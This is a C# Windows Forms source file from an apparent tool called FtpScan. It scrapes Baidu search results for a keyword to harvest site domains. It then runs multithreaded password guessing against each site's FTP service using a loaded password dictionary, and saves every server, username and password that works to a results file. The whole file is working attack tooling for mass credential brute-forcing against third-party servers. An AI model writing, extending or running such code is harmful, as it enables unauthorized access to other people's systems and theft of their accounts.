using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Web;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows;
namespace FtpScan
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string AppPath
        {
            get
            {
                return AppDomain.CurrentDomain.BaseDirectory;
            }
        }

        /// <summary>
        /// 搜索关键字
        /// </summary>
        static string keyword = string.Empty;
        /// <summary>
        /// 全局域名列表
        /// 用于保存当前任务列表
        /// </summary>
        static List<string> DOMAINS = new List<string>();

        private void btnScan_Click(object sender, EventArgs e)
        {
            Application.DoEvents();

            //初始化关键字
            keyword = this.txtSearchKey.Text;

            string download = Common.GetPageData("https://www.baidu.com/s?wd=" + keyword);
            //查找记录总数、以计算分页数
            string Count = Regex.Match(download, @"找到相关网页[约]?(\d{1,3}\,)*\d{1,3}篇").Value;
            //提取记录总数
            Count = Regex.Match(Count, @"((\d{1,3}\,)*\d{1,3})").Value.Replace(",", "");

            int ResultCount = 0;
            if (!int.TryParse(Count, out ResultCount))
            {
                MessageBox.Show("读取总记录数出错！\n页面代码：\n" + download, "错误信息", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            #region 读取第一页的域名

            //提取当前页面域名      
            List<string> sitedomans = new List<string>();
            sitedomans = Common.GetDomainListFromString(download);
            #endregion


            //开始 读取其他页面
            int currpage = 2;
            //初始化线程
            ScanThread = new Thread[(int)this.numericUpDown1.Value];

            while (currpage < ResultCount / 10 && currpage < 77)
            {
                for (int i = 0; i < ScanThread.Length && currpage < ResultCount / 10 && currpage < 77; i++)
                {
                    if (ScanThread[i] == null || ScanThread[i].ThreadState == System.Threading.ThreadState.Stopped)
                    {
                        DomainSource ds = new DomainSource(sitedomans, currpage, keyword);
                        ScanThread[i] = new Thread(ds.GetSiteName);
                        ScanThread[i].IsBackground = true;
                        ThreadAddLog("线程" + (i + 1) + ":  第" + currpage + "页");
                        ScanThread[i].Start();
                        currpage++;
                    }
                    Thread.Sleep(50);
                }
            }

            ThreadAddLog("等待所有线程结束!");

            //for (int i = 0; i < ScanThread.Length; i++)
            //{
            //    if (ScanThread[i] != null && !ScanThread[i].IsAlive)
            //    {
            //        ScanThread[i].Join();
            //        Thread.Sleep(2000);
            //    }
            //}
            while (true)
            {
                if (DomainSource.ScaningThreadCount == 0)
                {
                    WriteLog("全部停止了!");
                    break;
                    
                }
                else
                {
                    WriteLog(string.Format("还有{0}个等待结束!", DomainSource.ScaningThreadCount));
                }
                Thread.Sleep(1000);
            }

            //存入全局变量 //并去除重复
            DOMAINS = sitedomans.Distinct().ToList();
            //写入文件
            SaveCurrentStringList(keyword, DOMAINS);
            ThreadAddLog("共：" + ResultCount + "条结果！\t" + DOMAINS.Count + "个域名");
        }

        private void NewMethod(List<string> sitedomans, int currpage)
        {
            try
            {
                Application.DoEvents();
                var pageData = Common.GetPageData("http://www.baidu.com/s?wd=" + keyword + "&pn=" + currpage);
                var result = Common.GetDomainListFromString(pageData);
                int cout = sitedomans.Count;
                foreach (string index in result)
                {
                    ThreadAddLog(cout + ":" + index);
                    cout++;
                }

                //加入临时列表
                sitedomans.AddRange(result);

            }
            catch
            {

            }
        }
        /// <summary>
        /// 保存找到的域名结果
        /// </summary>
        /// <param name="keyword"></param>
        /// <param name="list"></param>
        private void SaveCurrentStringList(string keyword, List<string> list)
        {
            string file = keyword + ".txt";
            //if (File.Exists(file))
            //{
            //    File.Delete(file);
            //}
            List<string> dmList = DomainSource.LoadFormFile(keyword);
            dmList.AddRange(list);
            DOMAINS = dmList.Distinct().ToList();
            StreamWriter sw = new StreamWriter(file, false);
            //sw.WriteLine("========================================" + DateTime.Now + ": " + list.Count + "个结果==============================================");
            foreach (var item in DOMAINS)
            {
                sw.WriteLine(item);
            }
            //程序结束前关闭文件流
            sw.Close();
            this.txtDomianListFile.Text = file;
        }
        Thread[] ScanThread;
        private void button1_Click(object sender, EventArgs e)
        {
            Application.DoEvents();
            //初始化线程
            ScanThread = new Thread[(int)this.numericUpDown1.Value];

            List<string> sitedomans = DomainSource.LoadFormFile(this.txtDomianListFile.Text);

            List<Ftp> ftps = new List<Ftp>();
            sitedomans.ForEach(item =>
            {
                ftps.Add(new Ftp(item, DomainSource.Dic));
            });

            for (int j = 0; j < sitedomans.Count; )
            {
                for (int i = 0; i < ScanThread.Length && j < sitedomans.Count; i++)
                {
                    Thread th = ScanThread[i];
                    if (th == null || th.ThreadState == System.Threading.ThreadState.Stopped)
                    {

                        th = new Thread(new Ftp(sitedomans[j], DomainSource.Dic).TestPwd);
                        th.IsBackground = true;
                        ThreadAddLog("线程" + (i + 1) + ":  第" + j + "个任务:" + sitedomans[j]);
                        th.Start();
                        j++;
                    }

                }
            }

            WriteResult(DomainSource.ConvertToListFtp(sitedomans));
        }
        private void WriteResult(List<Ftp> objs)
        {

            string resultList = Path.Combine(AppPath, keyword + DateTime.Now.Ticks + ".txt");
            FileStream fs = new FileStream(resultList, FileMode.OpenOrCreate);
            lock (fs)
            {
                StreamWriter s = new StreamWriter(fs);
                foreach (var item in objs)
                {
                    if (item.IsPass)
                    {
                        s.WriteLine("server:" + item.Doman + "\tuid:" + item.UserName + "\tpwd:" + item.Pwd);
                    }
                }
                s.Close();
                s.Dispose();
                fs.Close();
                fs.Dispose();
            }




        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.DefaultExt = "txt";
            this.openFileDialog1.ShowDialog();
            this.txtDomianListFile.Text = this.openFileDialog1.FileName;
            DOMAINS = DomainSource.LoadFormFile(this.openFileDialog1.FileName);
            this.lblDomainCount.Text = string.Format(lblDomainCount.Text, DOMAINS.Count);

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Ftp.WriteLog += new WriteLog(ThreadAddLog);
            DomainSource.Dic = Ftp.GetPwdList();
            DomainSource.ThreadAddLog += ThreadAddLog;
        }

        public void ThreadAddLog(string str)
        {
            WriteLog kk = new WriteLog(WriteLog);
            this.Invoke(kk, str);
        }

        private void WriteLog(string logstr)
        {
            this.txtLog.AppendText(DateTime.Now + " > " + logstr + "\n");
            if (AutoScrollLog)
            {
                this.txtLog.ScrollToCaret();
            }

        }
        bool AutoScrollLog = true;

        private void button3_Click(object sender, EventArgs e)
        {
            Application.DoEvents();
            if (AutoScrollLog)
            {

                AutoScrollLog = false;
                ((Button)sender).Text = "自动滚屏";
            }
            else
            {
                AutoScrollLog = true;
                ((Button)sender).Text = "停止滚屏";
            }
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {

        }

    }
}
